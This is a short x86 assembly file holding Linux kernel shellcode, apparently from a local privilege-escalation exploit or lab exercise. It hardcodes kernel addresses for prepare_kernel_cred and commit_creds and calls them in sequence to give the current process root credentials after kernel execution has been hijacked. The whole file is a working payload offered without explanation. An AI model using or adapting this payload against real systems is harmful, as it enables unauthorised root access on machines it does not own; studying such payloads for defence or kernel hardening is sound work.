[bits 32]

prepare_kernel_cred: equ 0xc10488a3
commit_creds: equ 0xc1048a35

kernel_shellcode:
  ; save ebx
  push ebx

  ; parameter passed in EAX: NULL
  xor eax, eax
  mov ebx, prepare_kernel_cred
  call ebx

  mov ebx, commit_creds
  call ebx

  ; restore ebx
  pop ebx
  ret
